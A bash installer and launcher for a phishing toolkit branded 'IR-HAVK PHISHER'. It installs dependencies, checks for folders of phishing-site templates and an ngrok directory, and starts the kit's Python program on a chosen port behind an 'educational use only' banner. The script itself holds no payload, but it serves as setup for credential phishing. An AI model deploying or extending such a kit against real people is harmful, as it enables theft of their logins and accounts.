#!/bin/bash
#  IR-HAVK PHISHER - Ultimate Setup & Launcher Script     
#  By ATHEX BLACK HAT                          
             
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BLACK='\033[0;30m'
BOLD='\033[1m'
BLINK='\033[5m'
NC='\033[0m'

clear

loading_animation() {
    local pid=$1
    local message=$2
    local spin='-\|/'
    local i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) %4 ))
        printf "\r${CYAN}[${spin:$i:1}]${NC} ${message}"
        sleep 0.1
    done
    printf "\r"
}

progress_bar() {
    local duration=$1
    local message=$2
    local width=50
    for ((i=0; i<=width; i++)); do
        local percent=$((i*100/width))
        printf "\r${CYAN}[${GREEN}"
        for ((j=0; j<i; j++)); do printf "█"; done
        for ((j=i; j<width; j++)); do printf "░"; done
        printf "${CYAN}] ${percent}%%${NC} - ${message}"
        sleep $(echo "scale=2; $duration/$width" | bc)
    done
    echo ""
}

matrix_effect() {
    echo -e "${GREEN}"
    for ((i=0; i<5; i++)); do
        echo "01001000 01100001 01100011 01101011 00100000 01010100 01101000 01100101 00100000 01010000 01101100 01100001 01101110 01100101 01110100"
        sleep 0.1
    done
    echo -e "${NC}"
}

show_logo() {
    clear
    echo -e "${GREEN}"
    cat << "EOF"
    
    ██╗██████╗       ██╗  ██╗ █████╗ ██╗   ██╗██╗  ██╗
    ██║██╔══██╗      ██║  ██║██╔══██╗██║   ██║██║ ██╔╝
    ██║██████╔╝█████╗███████║███████║██║   ██║█████╔╝ 
    ██║██╔══██╗╚════╝██╔══██║██╔══██║╚██╗ ██╔╝██╔═██╗ 
    ██║██║  ██║      ██║  ██║██║  ██║ ╚████╔╝ ██║  ██╗
    ╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝
    
    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
              CREATED  -  BY ATHEX BLACK HAT
    
EOF
    echo -e "${RED}                       "
    echo -e "  ULTIMATE SETUP & LAUNCHER  "
    echo -e "  By ATHEX BLACK HAT         "
    echo -e "                  ${NC}"
    echo ""
}

spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while ps -p $pid > /dev/null 2>&1; do
        local temp=${spinstr#?}
        printf "${CYAN}[%c]${NC} " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

typewriter() {
    local text="$1"
    local delay=${2:-0.03}
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        echo -e "${RED}[!] WARNING: Running as root is not recommended!${NC}"
        sleep 2
    fi
}

detect_os() {
    echo -e "${CYAN}[*] Detecting Operating System...${NC}"
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        if [ -f /etc/os-release ]; then
            . /etc/os-release
            DISTRO=$ID
        fi
        echo -e "${GREEN}[✓] Linux Detected: $DISTRO${NC}"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        echo -e "${GREEN}[✓] macOS Detected${NC}"
    elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]]; then
        OS="windows"
        echo -e "${GREEN}[✓] Windows Detected${NC}"
    else
        OS="unknown"
        echo -e "${RED}[✗] Unknown OS${NC}"
    fi
}

check_package_manager() {
    echo -e "\n${CYAN}[*] Checking package manager...${NC}"
    if command -v apt &> /dev/null; then
        PKG_MANAGER="apt"
        INSTALL_CMD="sudo apt install -y"
        UPDATE_CMD="sudo apt update"
        echo -e "${GREEN}[✓] APT package manager found${NC}"
    elif command -v apt-get &> /dev/null; then
        PKG_MANAGER="apt-get"
        INSTALL_CMD="sudo apt-get install -y"
        UPDATE_CMD="sudo apt-get update"
        echo -e "${GREEN}[✓] APT-GET package manager found${NC}"
    elif command -v yum &> /dev/null; then
        PKG_MANAGER="yum"
        INSTALL_CMD="sudo yum install -y"
        UPDATE_CMD="sudo yum update"
        echo -e "${GREEN}[✓] YUM package manager found${NC}"
    elif command -v dnf &> /dev/null; then
        PKG_MANAGER="dnf"
        INSTALL_CMD="sudo dnf install -y"
        UPDATE_CMD="sudo dnf check-update"
        echo -e "${GREEN}[✓] DNF package manager found${NC}"
    elif command -v pacman &> /dev/null; then
        PKG_MANAGER="pacman"
        INSTALL_CMD="sudo pacman -S --noconfirm"
        UPDATE_CMD="sudo pacman -Sy"
        echo -e "${GREEN}[✓] Pacman package manager found${NC}"
    elif command -v brew &> /dev/null; then
        PKG_MANAGER="brew"
        INSTALL_CMD="brew install"
        UPDATE_CMD="brew update"
        echo -e "${GREEN}[✓] Homebrew package manager found${NC}"
    elif command -v pkg &> /dev/null; then
        PKG_MANAGER="pkg"
        INSTALL_CMD="pkg install -y"
        UPDATE_CMD="pkg update"
        echo -e "${GREEN}[✓] PKG (Termux) package manager found${NC}"
    else
        echo -e "${RED}[✗] No supported package manager found!${NC}"
        echo -e "${YELLOW}[!] Please install dependencies manually${NC}"
        PKG_MANAGER="manual"
    fi
}

# Install dependencies
install_dependencies() {
    echo -e "\n${CYAN}${NC}"
    echo -e "${CYAN}  📦 CHECKING & INSTALLING DEPENDENCIES  ${NC}"
    echo -e "${CYAN}${NC}\n"
    
    local packages=("php" "curl" "wget" "unzip" "git")
    local missing_pkgs=()
    
    for pkg in "${packages[@]}"; do
        echo -ne "${YELLOW}[*] Checking $pkg...${NC}"
        sleep 0.3
        if command -v $pkg &> /dev/null; then
            echo -e "\r${GREEN}[✓] $pkg is installed${NC}                    "
        else
            echo -e "\r${RED}[✗] $pkg is missing${NC}                     "
            missing_pkgs+=($pkg)
        fi
    done
    
    if [ ${#missing_pkgs[@]} -gt 0 ]; then
        echo -e "\n${YELLOW}[!] Missing packages: ${missing_pkgs[*]}${NC}"
        echo -e "${CYAN}[*] Installing missing packages...${NC}"
        
        if [ "$PKG_MANAGER" != "manual" ]; then
            $UPDATE_CMD &> /dev/null &
            loading_animation $! "Updating package lists..."
            
            for pkg in "${missing_pkgs[@]}"; do
                echo -e "${CYAN}[*] Installing ${YELLOW}$pkg${CYAN}...${NC}"
                if $INSTALL_CMD $pkg &> /dev/null; then
                    echo -e "${GREEN}[✓] $pkg installed successfully!${NC}"
                else
                    echo -e "${RED}[✗] Failed to install $pkg${NC}"
                fi
            done
        else
            echo -e "${RED}[✗] Cannot install automatically. Please install manually:${NC}"
            echo -e "${YELLOW}    ${missing_pkgs[*]}${NC}"
        fi
    else
        echo -e "\n${GREEN}[✓] All dependencies are installed!${NC}"
    fi
}

check_php_modules() {
    echo -e "\n${CYAN}[*] Checking PHP configuration...${NC}"
    if command -v php &> /dev/null; then
        PHP_VERSION=$(php -v 2>&1 | head -n 1 | cut -d' ' -f2)
        echo -e "${GREEN}[✓] PHP Version: $PHP_VERSION${NC}"
        
        # Check if PHP can start a server
        if php -r "echo 'OK';" &> /dev/null; then
            echo -e "${GREEN}[✓] PHP CLI is working${NC}"
        else
            echo -e "${RED}[✗] PHP CLI has issues${NC}"
        fi
    fi
}

check_file_structure() {
    echo -e "\n${CYAN}${NC}"
    echo -e "${CYAN}  📁 CHECKING FILE STRUCTURE  ${NC}"
    echo -e "${CYAN}${NC}\n"
    
    local required_files=(
        "ir-havk.py"
        "files/templates.json"
        "files/version.txt"
        "src/websites.zip"
    )
    
    local required_dirs=(
        "src/ngrok"
        "src/phishingsites"
    )
    
    local all_ok=true
    
    for file in "${required_files[@]}"; do
        echo -ne "${YELLOW}[*] Checking $file...${NC}"
        sleep 0.2
        if [ -f "$file" ]; then
            echo -e "\r${GREEN}[✓] $file found${NC}                    "
        else
            echo -e "\r${RED}[✗] $file missing${NC}                   "
            all_ok=false
        fi
    done
    
    for dir in "${required_dirs[@]}"; do
        echo -ne "${YELLOW}[*] Checking $dir/...${NC}"
        sleep 0.2
        if [ -d "$dir" ]; then
            echo -e "\r${GREEN}[✓] $dir/ found${NC}                    "
        else
            echo -e "\r${RED}[✗] $dir/ missing${NC}                   "
            all_ok=false
        fi
    done
    
    if [ "$all_ok" = false ]; then
        echo -e "\n${RED}[✗] Some required files are missing!${NC}"
        echo -e "${YELLOW}[!] Please ensure all files are in place:${NC}"
        echo -e "${CYAN}  ir-havk_phisher/"
        echo -e "  ├── ir-havk.py"
        echo -e "  ├── files/"
        echo -e "  │   ├── templates.json"
        echo -e "  │   ├── version.txt"
        echo -e "  │   └── changelog.log"
        echo -e "  └── src/"
        echo -e "      ├── websites.zip"
        echo -e "      ├── ngrok/"
        echo -e "      └── phishingsites/${NC}"
        return 1
    else
        echo -e "\n${GREEN}[✓] All required files are present!${NC}"
        return 0
    fi
}

# Check port availability
check_port() {
    local default_port=8080
    echo -e "\n${CYAN}[*] Checking port $default_port availability...${NC}"
    
    if command -v netstat &> /dev/null; then
        if netstat -tuln | grep -q ":$default_port "; then
            echo -e "${YELLOW}[!] Port $default_port is in use${NC}"
            echo -e "${CYAN}[*] You can use a different port with: -p PORT${NC}"
        else
            echo -e "${GREEN}[✓] Port $default_port is available${NC}"
        fi
    elif command -v ss &> /dev/null; then
        if ss -tuln | grep -q ":$default_port "; then
            echo -e "${YELLOW}[!] Port $default_port is in use${NC}"
        else
            echo -e "${GREEN}[✓] Port $default_port is available${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Cannot check port (netstat/ss not found)${NC}"
    fi
}

# Make script executable
make_executable() {
    if [ -f "ir-havk.py" ]; then
        chmod +x ir-havk.py 2>/dev/null
        echo -e "${GREEN}[✓] Made ir-havk.py executable${NC}"
    fi
}

# Cool system info display
show_system_info() {
    echo -e "\n${CYAN}${NC}"
    echo -e "${CYAN}  💻 SYSTEM INFORMATION  ${NC}"
    echo -e "${CYAN}${NC}\n"
    
    echo -e "${PURPLE}${NC}"
    echo -e "${PURPLE}${NC} ${CYAN}OS:${NC}      $(uname -s) $(uname -r)"
    echo -e "${PURPLE}${NC} ${CYAN}Arch:${NC}    $(uname -m)"
    echo -e "${PURPLE}${NC} ${CYAN}Host:${NC}    $(hostname)"
    echo -e "${PURPLE}${NC} ${CYAN}User:${NC}    $(whoami)"
    echo -e "${PURPLE}${NC} ${CYAN}Shell:${NC}   $SHELL"
    [ -f /etc/os-release ] && echo -e "${PURPLE}${NC} ${CYAN}Distro:${NC}  $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
    echo -e "${PURPLE}${NC} ${CYAN}Kernel:${NC}  $(uname -r)"
    echo -e "${PURPLE}${NC} ${CYAN}Memory:${NC}  $(free -h 2>/dev/null | grep Mem | awk '{print $2}' || echo 'N/A')"
    echo -e "${PURPLE}${NC}"
}

countdown() {
    local seconds=$1
    local message=$2
    echo -ne "${YELLOW}$message ${NC}"
    for ((i=seconds; i>0; i--)); do
        echo -ne "${RED}$i${NC} "
        sleep 1
    done
    echo ""
}

# Main menu
main_menu() {
    echo -e "\n${CYAN}${NC}"
    echo -e "${CYAN}  ✅ SETUP COMPLETED SUCCESSFULLY!  ${NC}"
    echo -e "${CYAN}${NC}\n"
    
    echo -e "${PURPLE}${NC}"
    echo -e "${PURPLE}${NC}  ${GREEN}IR-HAVK PHISHER is ready!       ${PURPLE}${NC}"
    echo -e "${PURPLE}${NC}  ${YELLOW}All dependencies installed      ${PURPLE}${NC}"
    echo -e "${PURPLE}${NC}  ${YELLOW}File structure verified         ${PURPLE}${NC}"
    echo -e "${PURPLE}${NC}"
    
     echo -e "\n${BOLD}${WHITE}Do you want to launch IR-HAVK PHISHER now?${NC}"
     
     echo -e "${PURPLE}${NC}██╗██████╗       ██╗  ██╗ █████╗ ██╗   ██╗██╗  ██╗ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC}██║██╔══██╗      ██║  ██║██╔══██╗██║   ██║██║ ██╔╝ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC}██║██████╔╝█████╗███████║███████║██║   ██║█████╔╝  ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC}██║██╔══██╗╚════╝██╔══██║██╔══██║╚██╗ ██╔╝██╔═██╗  ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC}██║██║  ██║      ██║  ██║██║  ██║ ╚████╔╝ ██║  ██╗ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC}╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝ ${PURPLE}${NC}"
    
     echo -e "${PURPLE}${NC} ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗  ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC} ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC} ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC} ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC} ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC} ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ${PURPLE}${NC}"
     echo -e "${PURPLE}${NC}      CREATED  -  BY ATHEX BLACK HAT                 ${PURPLE}${NC}"

    echo -e "${GREEN}  [1] ${WHITE}YES - Launch immediately${NC}"
    echo -e "${GREEN}  [2] ${WHITE}YES - Launch on custom port${NC}"
    echo -e "${RED}    [3] ${WHITE}NO  - Exit${NC}"
    echo -ne "\n${CYAN}[?] Enter your choice (1-3): ${NC}"
    
    read -r choice
    
    case $choice in
        1)
            echo -e "\n${GREEN}[*] Launching IR-HAVK PHISHER on default port 8080...${NC}"
            sleep 1
            matrix_effect
            clear
            python3 ir-havk.py
            ;;
        2)
            echo -ne "\n${CYAN}[?] Enter port number: ${NC}"
            read -r custom_port
            if [[ $custom_port =~ ^[0-9]+$ ]] && [ $custom_port -ge 1 ] && [ $custom_port -le 65535 ]; then
                echo -e "\n${GREEN}[*] Launching IR-HAVK PHISHER on port $custom_port...${NC}"
                sleep 1
                clear
                python3 ir-havk.py -p "$custom_port"
            else
                echo -e "${RED}[✗] Invalid port number! Using default port 8080${NC}"
                sleep 2
                clear
                python3 ir-havk.py
            fi
            ;;
        3)
            echo -e "\n${YELLOW}[!] Exiting...${NC}"
            echo -e "${GREEN}[✓] You can run the tool later with: ${CYAN}python3 ir-havk.py${NC}"
            echo -e "${GREEN}[✓] Or run this setup again: ${CYAN}./setup.sh${NC}"
            sleep 2
            exit 0
            ;;
        *)
            echo -e "\n${RED}[✗] Invalid choice! Exiting...${NC}"
            sleep 2
            exit 1
            ;;
    esac
}

show_warning() {
    clear
    echo -e "${RED}"
    cat << "EOF"
                                                               
    ⚠️  WARNING: EDUCATIONAL USE ONLY  ⚠️            
                                                               
    This tool is for authorized security testing and         
    educational purposes only.                               
                                                               
    Unauthorized use of this tool is ILLEGAL.               
                                                               
    You are responsible for complying with all applicable    
    laws and regulations.                                    

EOF
    echo -e "${NC}"
    typewriter "${YELLOW}Press ENTER to continue or Ctrl+C to abort...${NC}" 0.03
    read -r
}
main() {
    clear
    show_logo
    show_warning
    echo -e "\n${CYAN}${NC}"
    echo -e "${CYAN}  🔍 STARTING SYSTEM CHECK  ${NC}"
    echo -e "${CYAN}${NC}"
    check_root
    detect_os
    show_system_info
    check_package_manager
    install_dependencies
    check_php_modules
    progress_bar 2 "Verifying file structure..."
    if ! check_file_structure; then
        echo -e "\n${RED}[✗] Cannot continue without required files!${NC}"
        echo -e "${YELLOW}[!] Please add missing files and run setup again.${NC}"
        exit 1
    fi
    check_port
    make_executable
    echo -e "\n${GREEN}${NC}"
    echo -e "${GREEN}  🎉 ALL CHECKS PASSED!  ${NC}"
    echo -e "${GREEN}${NC}"
    countdown 3 "Launching menu in..."
    main_menu
}
trap 'echo -e "\n\n${RED}[!] Setup interrupted by user${NC}"; exit 1' INT
main